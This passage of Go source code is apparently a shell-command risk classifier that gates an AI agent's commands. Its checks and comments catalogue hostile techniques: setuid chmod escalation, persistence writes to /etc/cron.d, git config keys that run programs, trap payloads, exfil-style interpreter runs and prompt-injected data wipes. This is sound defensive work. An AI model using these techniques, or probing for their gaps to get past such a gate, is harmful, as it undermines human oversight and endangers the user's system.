		if tok == "of=" && len(tokens) > 1 {
			for j := range tokens {
				if isBlockDevice(tokens[j]) {
					return true
				}
			}
		}
	}
	return false
}

func isSystemWrite(first string, tokens []string) bool {
	if first == "sudo" {
		return true
	}
	if systemPrefixes[first] {
		return true
	}
	// kill pid 1 (init) or broadcast pid -1 is host-level, not a
	// hung-test cleanup. Ordinary kill/pkill stay safe via safeCommands.
	if first == "kill" && killTargetsInitOrBroadcast(tokens) {
		return true
	}
	if hostInspectorMutates(first, tokens) {
		return true
	}
	if first == "sysctl" && hasAny(tokens, "-w", "--write") {
		return true
	}
	// chmod that sets the setuid/setgid bit is privilege escalation regardless
	// of the target path: a setuid binary runs with its owner's privileges, so
	// `chmod u+s`, `chmod 4755`, `chmod 6755`, etc. must require approval. Plain
	// chmod (e.g. `chmod +x script.sh`) stays local_write below.
	if first == "chmod" && chmodSetsSUIDGID(tokens) {
		return true
	}
	// install -m / mkdir -m / mknod -m set the same mode bits at creation.
	if (first == "install" || first == "mkdir" || first == "mknod") && modeOptionSetsSUIDGID(first, tokens) {
		return true
	}
	// A filesystem-mutating command (cp/mv/tee/ln/install/touch/mkdir/chmod/…)
	// whose operand is a system path writes outside the workspace — classic
	// persistence/escalation (e.g. `cp x /etc/cron.d/job`, `tee /usr/bin/foo`,
	// `mv x /etc/profile.d/y`). isLocalWrite would otherwise short-circuit these
	// to local_write (auto-allow) before the touchesSystemPath fallback runs,
	// because that fallback only fires for commands that fell through every
	// write check. Escalate them here so they prompt instead.
	if (writePrefixes[first] && !commandOnlyReads(first, tokens)) || first == "ln" || first == "install" {
		for _, tok := range tokens[1:] {
			if shellPathIsSensitive(tok) {
				return true
			}
		}
	}
	// Directory destinations and rsync's final operand: the file that lands
	// is <dir>/<basename(src)>, so a rc file moved into $HOME is a rc write.
	for _, dest := range writeDestinations(first, tokens) {
		if shellPathIsSensitive(dest) {
			return true
		}
	}
	// Check redirect targets for sensitive paths
	for _, tok := range tokens {
		if isRedirectToken(tok) {
			continue
		}
		if shellPathIsSensitive(tok) {
			// Check if it's a redirect target (token follows a redirect op)
			for i, t := range tokens {
				if isRedirectToken(t) && i+1 < len(tokens) && tokens[i+1] == tok {
					return true
				}
			}
		}
	}
	// dd of=... writes its output to an arbitrary path; catch writes to
	// rc files and trust anchors that would otherwise slip through as safe.
	if first == "dd" {
		for _, tok := range tokens {
			if strings.HasPrefix(strings.ToLower(tok), "of=") && shellPathIsSensitive(tok) {
				return true
			}
		}
	}
	return false
}

// chmodSetsSUIDGID reports whether a chmod invocation sets the setuid or setgid
// bit, either symbolically (u+s, g+s, +s, u=rws, a=rwxs, …) or via an octal
// mode whose leading special-permission digit includes 4 (setuid) or 2
// (setgid) — e.g. 4755, 2755, 6755. A plain 3- or 4-digit mode with a 0
// special digit (0755) does not.
//
// Only the mode argument (the first non-flag operand) is inspected; trailing
// tokens are filenames and must not trigger on an incidental "+...s" or octal
// shape (e.g. a file named build+gen.s).
func chmodSetsSUIDGID(tokens []string) bool {
	args := tokens[1:]
	// chmod --reference copies mode bits including setuid/setgid.
	for _, o := range chmodOptions.parse(args).opts {
		if o.unique() && o.is("--reference") {
			return true
		}
	}
	for i := 0; i < len(args); {
		tok := args[i]
		if strings.HasPrefix(tok, "-") {
			// GNU chmod takes a symbolic mode that begins with '-' (`-x,u+s`,
			// `-w,g+s`) as the mode operand, not as an option. Anything built
			// only from mode characters is inspected as a mode; if it does not
			// set a special bit the scan continues, since the real mode (or a
			// file) may follow.
			if !symbolicModeLike(tok) {
				// A flag (e.g. -R, --recursive); --reference takes a file name
				// that is not the mode.
				_, i = chmodOptions.option(args, i)
				continue
			}
			if modeSetsSUIDGID(tok) {
				return true
			}
			i++
			continue
		}
		// Symbolic clauses that set the 's' permission (u+s, g+s, a+s, +s,
		// ug+rs, u=rws, a=rwxs, …) and octal modes whose special-permission
		// digits (everything but the last three) include 2 or 4: 04755 and
		// 4755 set setuid; 0755 / 1755 (sticky only) and 3-digit modes do not.
		// First non-flag operand is the mode; everything after is a filename.
		return modeSetsSUIDGID(tok)
	}
	return false
}

// chmodOptions is the grammar of chmod's own options: --reference is the only
// one that takes a value.
var chmodOptions = optSpec{
	long:           longTable("reference", "changes silent quiet verbose recursive preserve-root no-preserve-root help version"),
	abbrev:         true,
	ignoreDashDash: true,
}

// symbolicModeLike reports whether a dash-leading chmod word is spelled only
// with symbolic-mode characters, so it can be the mode operand rather than an
// option (`-x`, `-w,g+s`, `-rwx,u+s`; `-R`, `-v` and long options are not).
func symbolicModeLike(tok string) bool {
	if len(tok) < 2 || strings.HasPrefix(tok, "--") {
		return false
	}
	for i := 1; i < len(tok); i++ {
		if !strings.ContainsRune("rwxXstugoa,+=-", rune(tok[i])) {
			return false
		}
	}
	return true
}

// modeSetsSUIDGID reports whether a single mode word (symbolic or octal) sets
// the setuid or setgid bit.
func modeSetsSUIDGID(mode string) bool {
	if plus := strings.IndexByte(mode, '+'); plus >= 0 && strings.ContainsRune(mode[plus+1:], 's') {
		return true
	}
	if eq := strings.IndexByte(mode, '='); eq >= 0 && strings.ContainsRune(mode[eq+1:], 's') {
		return true
	}
	if isOctalMode(mode) && len(mode) >= 4 {
		for _, d := range mode[:len(mode)-3] {
			if d >= '2' && d <= '7' {
				return true
			}
		}
	}
	return false
}

// modeOptionSetsSUIDGID reports whether an install/mkdir/mknod invocation
// passes a -m/--mode value that sets the setuid or setgid bit, in any
// spelling: `-m 4755`, `-m4755`, `-Dm4755`, `--mode=u+s`, `--mode u+s`.
func modeOptionSetsSUIDGID(first string, tokens []string) bool {
	if len(tokens) == 0 {
		return false
	}
	for _, mode := range modeOptions[first].parse(tokens[1:]).values("-m", "--mode") {
		if mode != "" && chmodSetsSUIDGID([]string{"chmod", mode}) {
			return true
		}
	}
	return false
}

// modeOptions are the option grammars of the coreutils that take a creation
// mode. -Z (SELinux context) is a flag in all of them, so `-Zm4755` still
// carries a mode.
var modeOptions = map[string]optSpec{
	"install": {
		short: "gmotS",
		long: longTable("mode owner group target-directory suffix strip-program",
			"backup compare directory create-leading-dirs no-target-directory preserve-timestamps strip verbose debug context preserve-context"),
		abbrev: true,
	},
	"mkdir": {short: "m", long: longTable("mode", "parents verbose context"), abbrev: true},
	"mknod": {short: "m", long: longTable("mode", "context"), abbrev: true},
}

// isOctalMode reports whether s is composed entirely of octal digits (0-7).
func isOctalMode(s string) bool {
	if s == "" {
		return false
	}
	for _, r := range s {
		if r < '0' || r > '7' {
			return false
		}
	}
	return true
}

func isLocalWrite(first string, tokens []string) bool {
	if commandOnlyReads(first, tokens) && !stageHasOutputRedirect(tokens) {
		return false
	}
	if formattingMutates(first, tokens) {
		return true
	}
	// echo without redirect is safe (just displaying text)
	if first == "echo" {
		return stageHasOutputRedirect(tokens)
	}
	if writePrefixes[first] {
		return true
	}
	// gh run download / release download write the fetched files locally.
	if first == "gh" && ghWritesLocalFiles(tokens) {
		return true
	}
	// find -fprint/-fprintf write match lists to a file (arbitrary path)
	if first == "find" && hasAny(tokens, "-fprint", "-fprintf") {
		return true
	}
	// Any command with an output redirect to a file is a write
	return stageHasOutputRedirect(tokens)
}

func isNetworkEgress(first string, tokens []string) bool {
	if !networkPrefixes[first] {
		return false
	}
	// git subcommands that inherently contact a remote.
	if first == "git" {
		sub, args := gitSubcommandAndArgs(tokens)
		return gitContactsRemote(sub, tokens, args)
	}
	// openssl version/dgst stay local; s_client and friends open a socket.
	if first == "openssl" {
		return opensslContactsRemote(tokens)
	}
	// gh contacts GitHub for everything except help, version and completion;
	// an unrecognised verb counts as network-capable too (its own class,
	// unknown, is decided by classifyGH).
	if first == "gh" {
		return ghContactsNetwork(tokens)
	}
	// rsync: any non-flag operand containing `:` names a remote — the
	// implicit-current-user ssh form (host:/path, no `@`), the rsync://
	// scheme, and the legacy host::module form all carry one. A colon in a
	// local filename is rare enough that prompting on it is acceptable
	// fail-closed behaviour.
	if first == "rsync" {
		for _, tok := range tokens[1:] {
			if strings.HasPrefix(tok, "-") {
				continue
			}
			if strings.Contains(tok, ":") {
				return true
			}
		}
		return false
	}
	// Help/version queries do not open a socket (`curl --help`, `wget
	// --version`, `ssh -V`). Bare `curl` / `wget` still egress: they
	// wait for a URL or fetch a default target.
	if networkInfoQuery(tokens) {
		return false
	}
	// All other network commands are inherently egress
	return true
}

func networkInfoQuery(tokens []string) bool {
	if len(tokens) < 2 {
		return false
	}
	for _, t := range tokens[1:] {
		if interpreterInfoFlags[t] {
			continue
		}
		return false
	}
	return true
}

// gitCodeExecConfigKeys are git config keys whose values cause arbitrary
// command execution when set via -c/--config-env or git config.
var gitCodeExecConfigKeys = map[string]bool{
	"core.pager":        true,
	"core.fsmonitor":    true,
	"credential.helper": true,
	"core.hookspath":    true, "core.editor": true, "sequence.editor": true, "core.sshcommand": true,
	"core.askpass": true, "core.gitproxy": true, "core.alternaterefscommand": true,
	"uploadpack.packobjectshook": true, "gpg.program": true,
}

// gitConfigKeyRunsProgram reports whether a (lower-cased) git config key names
// a program or shell snippet git spawns: the fixed keys above plus the
// per-URL / per-remote / per-format variants (credential.<url>.helper,
// remote.<name>.uploadpack, gpg.<format>.program).
func gitConfigKeyRunsProgram(key string) bool {
	if gitCodeExecConfigKeys[key] {
		return true
	}
	switch {
	case strings.HasPrefix(key, "include.") || strings.HasPrefix(key, "includeif."),
		// An included file can set any key above; config-defined hooks and
		// interactive diff filters are programs git spawns.
		strings.HasPrefix(key, "hook.") && strings.HasSuffix(key, ".command"),
		key == "interactive.difffilter",
		strings.HasPrefix(key, "credential.") && strings.HasSuffix(key, ".helper"),
		strings.HasPrefix(key, "remote.") && (strings.HasSuffix(key, ".uploadpack") || strings.HasSuffix(key, ".receivepack")),
		strings.HasPrefix(key, "gpg.") && strings.HasSuffix(key, ".program"):
		return true
	}
	return false
}

// gitProgramOptions are the long options of network subcommands whose value is
// a program git runs locally to reach the "remote" (or a template directory
// whose hooks are copied into the new repository). git accepts any unambiguous
// prefix of a long option, so a prefix of one of these is flagged too.
var gitProgramOptions = []string{"upload-pack", "receive-pack", "exec", "template"}

// gitRunsProgramOption reports whether the subcommand arguments carry a
// program-valued option (--upload-pack, -u on clone, --receive-pack, --exec,
// --template).
func gitRunsProgramOption(sub string, args []string) bool {
	switch sub {
	case "clone", "fetch", "pull", "ls-remote", "push", "fetch-pack",
		"send-pack", "archive", "init":
	default:
		return false
	}
	for _, a := range args {
		if a == "--" {
			break
		}
		if strings.HasPrefix(a, "--") {
			name, _, _ := strings.Cut(a[2:], "=")
			if name == "" {
				continue
			}
			for _, opt := range gitProgramOptions {
				if strings.HasPrefix(opt, name) {
					return true
				}
			}
			continue
		}
		// clone -u <upload-pack>, also fused (-u/path) or clustered (-vu path).
		if sub == "clone" && isShortFlagToken(a) {
			for _, c := range a[1:] {
				if c == 'u' {
					return true
				}
				if strings.ContainsRune("obcj", c) {
					break
				}
			}
		}
	}
	return false
}

// isGitCodeExecution reports whether a git invocation carries a config override
// or subcommand that can execute arbitrary shell code. It deliberately errs on
// the side of classification rather than parsing the full git config grammar:
// aliases whose value starts with "!" run shell commands, and a small set of
// core/credential keys spawn pagers or helpers.
func isGitCodeExecution(tokens []string) bool {
	for i := 0; i < len(tokens); i++ {
		tok := tokens[i]
		if tok == "git" {
			continue
		}

		var val string
		consumed := false
		switch {
		case tok == "-c" || tok == "--config-env" || tok == "--config":
			if i+1 < len(tokens) {
				val = tokens[i+1]
				consumed = true
			}
		case strings.HasPrefix(tok, "--config="):
			val = tok[len("--config="):]
		case strings.HasPrefix(tok, "-c"):
			val = tok[2:]
		case strings.HasPrefix(tok, "--config-env="):
			val = tok[len("--config-env="):]
		case !strings.HasPrefix(tok, "-"):
			// Once we hit the subcommand, global options are done.
			if tok == "config" {
				return true
			}
			if tok == "filter-branch" {
				for _, a := range tokens[i+1:] {
					switch {
					case a == "--tree-filter", a == "--index-filter",
						a == "--msg-filter", a == "--commit-filter",
						a == "--tag-name-filter", a == "--parent-filter":
						return true
					case strings.HasPrefix(a, "--tree-filter="),
						strings.HasPrefix(a, "--index-filter="),
						strings.HasPrefix(a, "--msg-filter="),
						strings.HasPrefix(a, "--commit-filter="),
						strings.HasPrefix(a, "--tag-name-filter="),
						strings.HasPrefix(a, "--parent-filter="):
						return true
					}
				}
			}
		}

		if consumed {
			i++
		}
		if val == "" {
			continue
		}

		key, value, _ := strings.Cut(val, "=")
		key = strings.ToLower(key)
		if strings.HasPrefix(key, "alias.") && strings.HasPrefix(value, "!") {
			return true
		}
		if strings.HasPrefix(key, "submodule.") && strings.HasSuffix(key, ".update") && strings.HasPrefix(value, "!") {
			return true
		}
		if gitConfigKeyRunsProgram(key) || strings.HasPrefix(key, "filter.") || strings.HasPrefix(key, "diff.") || strings.HasPrefix(key, "merge.") {
			return true
		}
	}
	sub, args := gitSubcommandAndArgs(tokens)
	return gitRunsProgramOption(sub, args)
}

// gitGlobalOptions is the grammar of the options git accepts before the
// subcommand: -C and -c take the next word, and the long ones take it too
// unless spelled --opt=value. git reads them exactly (no abbreviations) and
// the first operand is the subcommand.
var gitGlobalOptions = optSpec{
	short: "Cc",
	long:  valueOpts("git-dir work-tree namespace exec-path super-prefix config-env attr-source"),
	posix: true,
}

// gitSubcommandAndArgs returns the git subcommand and the tokens that follow
// it, skipping global options. Options that take a separate value token
// (-C, -c, --git-dir, …) consume that token so it is not mistaken for the
// subcommand.
func gitSubcommandAndArgs(tokens []string) (sub string, args []string) {
	for i, tok := range tokens {
		if commandName(tok) != "git" {
			continue
		}
		words := gitGlobalOptions.parse(tokens[i+1:]).args()
		if len(words) == 0 {
			return "", nil
		}
		return words[0], words[1:]
	}
	return "", nil
}

// gitRetargetsFilesystem reports whether the invocation points git at a
// different repo, worktree, or index via --git-dir / --work-tree. Same
// class of hijack as GIT_DIR=… env assignments.
func gitRetargetsFilesystem(tokens []string) bool {
	for _, tok := range tokens {
		if tok == "--git-dir" || strings.HasPrefix(tok, "--git-dir=") ||
			tok == "--work-tree" || strings.HasPrefix(tok, "--work-tree=") {
			return true
		}
	}
	return false
}

// gitContactsRemote reports whether a parsed git subcommand talks to a remote.
func gitContactsRemote(sub string, tokens, args []string) bool {
	switch sub {
	case "clone", "fetch", "pull", "ls-remote",
		"daemon", "instaweb", "fetch-pack", "upload-pack",
		"send-pack", "receive-pack":
		return true
	case "push":
		// Bare "git push" pushes the current branch to its configured
		// upstream, so every push form contacts a remote.
		return true
	case "remote":
		return len(args) > 0 && (args[0] == "update" || args[0] == "prune")
	case "submodule":
		if len(args) == 0 {
			return false
		}
		switch args[0] {
		case "update", "add", "sync":
			return true
		}
		return false
	case "archive":
		for _, a := range args {
			if a == "--remote" || strings.HasPrefix(a, "--remote=") {
				return true
			}
		}
		return false
	case "lfs":
		if len(args) == 0 {
			return false
		}
		switch args[0] {
		case "fetch", "pull", "push", "clone":
			return true
		}
		return false
	case "svn":
		if len(args) == 0 {
			return false
		}
		switch args[0] {
		case "fetch", "clone", "dcommit", "rebase":
			return true
		}
		return false
	}
	return false
}

// gitSubmoduleForeachInner returns the command git submodule foreach will
// run in each submodule, or empty when this is not a foreach invocation.
func gitSubmoduleForeachInner(tokens []string) string {
	sub, args := gitSubcommandAndArgs(tokens)
	if sub != "submodule" || len(args) == 0 || args[0] != "foreach" {
		return ""
	}
	rest := args[1:]
	for len(rest) > 0 && strings.HasPrefix(rest[0], "-") {
		if rest[0] == "--" {
			rest = rest[1:]
			break
		}
		rest = rest[1:]
	}
	if len(rest) == 0 {
		return ""
	}
	return strings.Join(rest, " ")
}

// isGitDataLoss reports whether a git invocation irreversibly destroys
// uncommitted work, branches, stashes, or history:
//
//	git clean -f…            (unless -n/--dry-run is also given)
//	git reset --hard | --merge
//	git switch -f | --discard-changes
//	git rebase / cherry-pick / am   (except --abort / --quit)
//	git filter-branch / filter-repo
//	git replace -d / update-ref -d
//	git bundle unbundle
//	git init --separate-git-dir
//	git push --force / -f / --force-with-lease
//	git read-tree -u --reset
//	git submodule deinit -f
//	git checkout -f | -- <path> | <pathspec>
//	git restore <pathspec>   (worktree restore; --staged-only is safe)
//	git branch -D | -d -f
//	git stash drop | clear
//	git reflog expire
//
// These are classified system_write (prompt-by-default), not destructive,
// because they are routine recovery verbs with legitimate uses — but they
// must never run silently, since a prompt-injection payload can wipe a
// working tree through them with zero friction.
func isGitDataLoss(tokens []string) bool {
	sub, args := gitSubcommandAndArgs(tokens)
	switch sub {
	case "clean":
		// Only -f/--force deletes; -n/--dry-run prints and wins if both given.
		force, dryRun := false, false
		for _, a := range args {
			switch {
			case a == "--force":
				force = true
			case a == "--dry-run":
				dryRun = true
			case isShortFlagToken(a):
				if strings.ContainsRune(a[1:], 'f') {
					force = true
				}
				if strings.ContainsRune(a[1:], 'n') {
					dryRun = true
				}
			}
		}
		return force && !dryRun
	case "reset":
		return hasAny(args, "--hard", "--merge")
	case "switch":
		// -f/--force/--discard-changes throws away uncommitted work,
		// matching git checkout -f.
		for _, a := range args {
			if a == "--force" || a == "--discard-changes" ||
				(isShortFlagToken(a) && strings.ContainsRune(a[1:], 'f')) {
				return true
			}
		}
		return false
	case "rebase", "cherry-pick", "am":
		// History rewrite. --abort/--quit only restore the pre-rebase
		// state and are recovery, not loss.
		return !hasAny(args, "--abort", "--quit")
	case "filter-branch", "filter-repo":
		return true
	case "replace":
		return hasAny(args, "-d", "--delete")
	case "update-ref":
		return hasAny(args, "-d", "--delete")
	case "bundle":
		return len(args) > 0 && args[0] == "unbundle"
	case "init":
		for _, a := range args {
			if a == "--separate-git-dir" || strings.HasPrefix(a, "--separate-git-dir=") {
				return true
			}
		}
		return false
	case "push":
		// Force-push rewrites remote history. Network egress is
		// auto-allowed by default, so this must be data-loss instead.
		// Mirror/prune/delete pushes and forced (+) or deleting (:) refspecs
		// overwrite or remove remote refs the same way. git accepts any
		// unambiguous long-option prefix, so a prefix is flagged too.
		for _, a := range args {
			if strings.HasPrefix(a, "--") {
				name, _, _ := strings.Cut(a[2:], "=")
				if name == "" {
					continue
				}
				for _, opt := range []string{"force", "force-with-lease", "force-if-includes", "mirror", "delete", "prune"} {
					if strings.HasPrefix(opt, name) {
						return true
					}
				}
				continue
			}
			if isShortFlagToken(a) && (strings.ContainsRune(a[1:], 'f') || strings.ContainsRune(a[1:], 'd')) {
				return true
			}
			if strings.HasPrefix(a, "+") || strings.HasPrefix(a, ":") {
				return true
			}
		}
		return false
	case "read-tree":
		// -u --reset writes the worktree to match the tree-ish.
		return hasAny(args, "--reset") && (hasAny(args, "-u") || hasShortFlag(args, 'u'))
	case "submodule":
		if len(args) > 0 && args[0] == "deinit" {
			return hasAny(args, "--force") || hasShortFlag(args, 'f')
		}
		return false
	case "checkout":
		// -f/--force or a pathspec (-- <path>, ".", "./…") discards local
		// changes. A bare branch operand (git checkout main) switches, keeps
		// the worktree, and is not data loss. `<tree-ish> <pathspec>` without
		// the -- separator has identical discard semantics, so more than one
		// non-flag operand is data loss. Value-taking flags (-b/-B/--orphan/
		// --pathspec-from-file) consume their value first.
		operands := 0
		skipNext := false
		for _, a := range args {
			if skipNext {
				skipNext = false
				continue
			}
			switch {
			case a == "--force" || (isShortFlagToken(a) && strings.ContainsRune(a[1:], 'f')):
				return true
			case a == "--":
				return true
			case a == "." || strings.HasPrefix(a, "./"):
				return true
			case a == "-b" || a == "-B" || a == "--orphan" || strings.HasPrefix(a, "--pathspec-from-file"):
				if !strings.Contains(a, "=") {
					skipNext = true
				}
			case strings.HasPrefix(a, "-"):
				// Non-value flag (e.g. --detach, --ours).
			default:
				operands++
			}
		}
		return operands > 1
	case "restore":
		// Default restores the worktree from the index, discarding local
		// changes; --staged alone only unstages. --source/-s consumes a value.
		staged := hasAny(args, "--staged", "-S")
		for i := 0; i < len(args); i++ {
			a := args[i]
			if a == "--source" || a == "-s" {
				i++ // skip the source value
				continue
			}
			if a == "--worktree" || a == "-W" {
				return true
			}
			if (a == "--" || !strings.HasPrefix(a, "-")) && !staged {
				return true
			}
		}
		return false
	case "branch":
		// -D, or -d/--delete combined with -f/--force, deletes a branch
		// regardless of merge state.
		del, force := false, false
		for _, a := range args {
			switch {
			case a == "--delete":
				del = true
			case a == "--force":
				force = true
			case isShortFlagToken(a):
				if strings.ContainsRune(a[1:], 'D') {
					return true
				}
				if strings.ContainsRune(a[1:], 'd') {
					del = true
				}
				if strings.ContainsRune(a[1:], 'f') {
					force = true
				}
			}
		}
		if del && force {
			return true
		}
		// -f without a delete moves an existing branch ref, orphaning the
		// commits only it reached; -M force-renames over an existing branch.
		for _, a := range args {
			if isShortFlagToken(a) && strings.ContainsRune(a[1:], 'M') {
				return true
			}
		}
		return force
	case "tag":
		// Deleting or force-moving a tag removes the only name of its commit.
		for _, a := range args {
			if a == "--delete" || a == "--force" ||
				(isShortFlagToken(a) && (strings.ContainsRune(a[1:], 'd') || strings.ContainsRune(a[1:], 'f'))) {
				return true
			}
		}
		return false
	case "rm":
		// Without -f git refuses to remove files with local modifications; -f
		// deletes the work tree files and discards those modifications.
		for _, a := range args {
			if a == "--force" || (isShortFlagToken(a) && strings.ContainsRune(a[1:], 'f')) {
				return true
			}
		}
		return false
	case "prune":
		// --expire permanently deletes unreachable objects younger than the
		// default grace period.
		for _, a := range args {
			if a == "--expire" || strings.HasPrefix(a, "--expire=") {
				return true
			}
		}
		return false
	case "stash":
		return hasAny(args, "drop", "clear")
	case "reflog":
		return hasAny(args, "expire", "delete")
	case "worktree":
		// `worktree remove` deletes an entire working tree — including all
		// uncommitted work under --force, with no undo; `worktree prune`
		// drops worktree admin state. Both are bulk loss of local work.
		return hasAny(args, "remove", "prune")
	}
	return false
}

// isShortFlagToken reports whether a token is a single-dash option cluster
// like -f, -fdx, -Df (as opposed to a --long flag or an operand).
func isShortFlagToken(tok string) bool {
	return strings.HasPrefix(tok, "-") && !strings.HasPrefix(tok, "--") && len(tok) > 1
}

func hasShortFlag(args []string, flag rune) bool {
	for _, a := range args {
		if isShortFlagToken(a) && strings.ContainsRune(a[1:], flag) {
			return true
		}
	}
	return false
}

func isCodeExecution(first string, tokens []string, repo *gitRepoCtx) bool {
	if pipedShells[first] && (shellInlineScript(tokens) != "" || shellHasOperand(tokens)) {
		return true
	}
	if first == "find" && hasAny(tokens, "-exec", "-execdir", "-ok", "-okdir") {
		return true
	}
	// git -c/--config-env can inject arbitrary shell commands via aliases,
	// core.pager, core.fsmonitor, credential.helper, etc.; git config writes
	// can persist the same payloads.
	if adapterRunsCode(first, tokens, repo) {
		return true
	}
	if first == "git" && isGitCodeExecution(tokens) {
		return true
	}

	// Pipe to shell interpreter
	for i, tok := range tokens {
		if tok == "|" && i+1 < len(tokens) && pipedShells[commandName(tokens[i+1])] {
			return true
		}
	}

	// source / . FILE executes a script in the current shell.
	if first == "source" || first == "." {
		return true
	}

	// npx/bunx/uvx/pipx fetch and run a (possibly remote) package.
	// Version/help queries do not run anything (`npx --version`).
	if remoteRunPrefixes[first] {
		return interpreterRunsCode(tokens)
	}

	// trap registers a payload the same shell executes on a signal or exit
	// (`trap "<payload>" EXIT`). Only query forms (-l/-p/--list/--print)
	// are safe; anything carrying a payload is code execution. trap was
	// previously listed in safeCommands — a prompt-injected payload could
	// ride an auto-allowed Safe classification.
	if first == "trap" && !trapIsQuery(tokens) {
		return true
	}

	// bun executes inline code via -e/--eval. bun is absent from
	// codeEvalPrefixes (it is a package manager first), so `bun -e` fell
	// through isPackageManagerRun — which skips flags — into the Safe
	// install fallback while the equivalent `node -e` classifies as code
	// execution. (Payloads containing `/` or `.` were caught by the
	// package-run path heuristic; bare-code payloads were not.)
	if first == "bun" && hasAny(tokens, "-e", "--eval") {
		return true
	}
	// deno eval/run execute code. deno is a stdin-exec interpreter (so
	// it is a known command, not unknown/deny) but was missing the
	// eval/run gate that bun -e has — `deno run pwn.ts` was Safe.
	if first == "deno" && hasAny(tokens, "eval", "run", "repl", "test", "task", "compile", "-e", "--eval") {
		return true
	}

	// Package-manager subcommands that run arbitrary project-defined scripts
	// (npm/yarn/pnpm/bun run|start|test|exec, cargo run|bench, …).
	if isPackageManagerRun(first, tokens) {
		return true
	}

	// tar --to-command / --use-compress-program / -I run an arbitrary
	// helper on each archive member. Without this gate those forms
	// would be local_write (tar is a write prefix) and auto-allow.
	if first == "tar" && tarRunsCommand(tokens) {
		return true
	}
	// zip -TT CMD runs CMD to test the archive; cpio --rsh-command / --rmt-command
	// name the program that carries the archive to a remote host.
	if (first == "zip" && zipRunsCommand(tokens)) || (first == "cpio" && cpioRunsCommand(tokens)) {
		return true
	}

	// Embedded-shell interpreters: awk, ed/ex, vi/vim, emacs, etc. Their
	// payload (script expression or file operand) can invoke arbitrary shell
	// commands, so any non-trivial invocation is code execution.
	// awk is narrower: only scripts that call system()/pipes or an
	// uninspectable -f file escalate, so `awk '{print $1}' file` stays Safe.
	if first == "awk" || first == "gawk" || first == "mawk" || first == "nawk" {
		return awkRunsShellCode(tokens)
	}
	if embeddedShellInterpreters[first] && interpreterRunsCode(tokens) {
		return true
	}

	// make / pytest run project-defined recipes — code_execution (prompt),
	// not unknown (deny). Help/version queries stay non-executing.
	if projectExecCommands[first] {
		return interpreterRunsCode(tokens) || len(tokens) == 1
	}

	// sed's 'e' command and script files (-f/--file) execute shell code.
	if first == "sed" && sedRunsShellCode(tokens) {
		return true
	}

	if !isScriptEvalInterpreter(first) {
		// go run / go tool / go generate compile and execute code.
		if first == "go" {
			for _, tok := range tokens[1:] {
				if tok == "run" || tok == "tool" || tok == "generate" {
					return true
				}
			}
		}
		// pnpm dlx / yarn dlx fetch and run a package (like npx).
		if (first == "pnpm" || first == "yarn") && hasAny(tokens, "dlx") {
			return true
		}
		// uv run / uv tool run execute code. `uv tool` alone is a
		// namespace (`uv tool list` is inspect; `uv tool install` is
		// handled as install below) — do not treat every `tool` token
		// as execution.
		if first == "uv" && hasAny(tokens, "run") {
			return true
		}
		// dotnet/sbt run execute the built project. compile/test stay
		// safe via the toolchain allowlist.
		if first == "dotnet" && hasAny(tokens, "run") {
			return true
		}
		if first == "sbt" && hasAny(tokens, "run") {
			return true
		}
		if first == "swift" && hasAny(tokens, "run") {
			return true
		}
		if (first == "gdb" || first == "lldb") && interpreterRunsCode(tokens) {
			return true
		}
		if first == "sqlite3" && sqliteRunsShell(tokens) {
			return true
		}
		if dbClientRunsShell(first, tokens) {
			return true
		}
		if first == "buf" && hasAny(tokens, "generate") {
			return true
		}
		return false
	}

	// Syntax-check flags do not execute the file (`php -l`, `ruby -c`,
	// `node --check`). They used to prompt as code_execution.
	if interpreterIsSyntaxCheck(first, tokens) {
		return false
	}

	// eval is always code execution
	if first == "eval" {
		return true
	}

	// A script interpreter (node/python/perl/ruby/php) runs code whenever it
	// is given a script file or a code-bearing flag (-e/-c/-r/-m, etc.). Only
	// a bare REPL invocation or a pure version/help query is non-executing, so
	// `python exfil.py` no longer slips through as Safe.
	return interpreterRunsCode(tokens)
}

// interpreterInfoFlags are the only arguments a script interpreter can carry
// without running code — version and help queries. Anything else is either a
// script-file argument or a code-bearing flag.
var interpreterInfoFlags = map[string]bool{
	"--version": true, "-version": true, "-V": true, "-v": true,
	"--help": true, "-h": true, "--help-all": true, "--list": true,
}

// trapIsQuery reports whether a trap invocation only queries the current
// handler table (bare `trap`, -l/-p/--list/--print) rather than registering
// a payload.
func trapIsQuery(tokens []string) bool {
	for _, tok := range tokens[1:] {
		switch tok {
		case "-l", "-p", "--list", "--print":
			continue
		default:
			return false
		}
	}
	return true
}

// interpreterRunsCode reports whether a script-interpreter invocation will run
// code rather than merely print version/help text. A bare invocation (no args)
// classifies as non-executing.
func interpreterRunsCode(tokens []string) bool {
	for _, tok := range tokens[1:] {
		if interpreterInfoFlags[tok] {
			continue
		}
		return true
	}
	return false
}

func isAllDigits(s string) bool {
	if s == "" {
		return false
	}
	for _, r := range s {
		if r < '0' || r > '9' {
			return false
		}
	}
	return true
}

// awkRunsShellCode reports whether an awk invocation will run shell
// commands: an uninspectable script file (-f/--file), or an inline
// script that calls system() or pipes to a command. Plain field
// printing (`awk '{print $1}' file`) is not code execution.
func awkRunsShellCode(tokens []string) bool {
	if len(tokens) == 0 {
		return false
	}
	r := awkOptions.parse(tokens[1:])
	for _, o := range r.opts {
		switch {
		// A program loaded from file is uninspectable (-f/--file, and gawk's
		// -E/--exec, which reads the program the same way).
		case o.is("-f", "--file", "-E", "--exec"):
			return true
		// Inline program text reaches awk through -e/--source, fused into the
		// option word or as the next word.
		case o.has && o.is("-e", "--source") && awkScriptHasShellExec(o.value):
			return true
		}
	}
	// Bare program argument; every operand is checked because which one is the
	// program depends on whether -e/--source was given.
	for _, tok := range r.args() {
		if awkScriptHasShellExec(tok) {
			return true
		}
	}
	return false
}

// awkOptions is the grammar of awk/gawk options: -F (field separator), -v
// (assignment), -W, -f, -e, -E, -i and -l take a value. Long options may be
// abbreviated, and `--` ends nothing, so no word is hidden from the predicate.
var awkOptions = optSpec{
	short: "FvWfeEil",
	long: longTable("file source exec include load assign field-separator",
		"lint traditional posix re-interval sandbox dump-variables profile pretty-print version help"),
	abbrev:         true,
	ignoreDashDash: true,
}

func awkScriptHasShellExec(tok string) bool {
	if len(tok) >= 2 {
		if (tok[0] == '\'' && tok[len(tok)-1] == '\'') || (tok[0] == '"' && tok[len(tok)-1] == '"') {
			tok = tok[1 : len(tok)-1]
		}
	}
	if tok == "" {
		return false
	}
	lower := strings.ToLower(tok)
	if regexp.MustCompile(`\bsystem\b|@[A-Za-z_]`).MatchString(lower) {
		return true
	}
	return strings.Contains(tok, "|")
}

// sedRunsShellCode reports whether a sed invocation uses the 'e' command or
// loads a script file, either of which lets sed execute arbitrary shell code.
func sedRunsShellCode(tokens []string) bool {
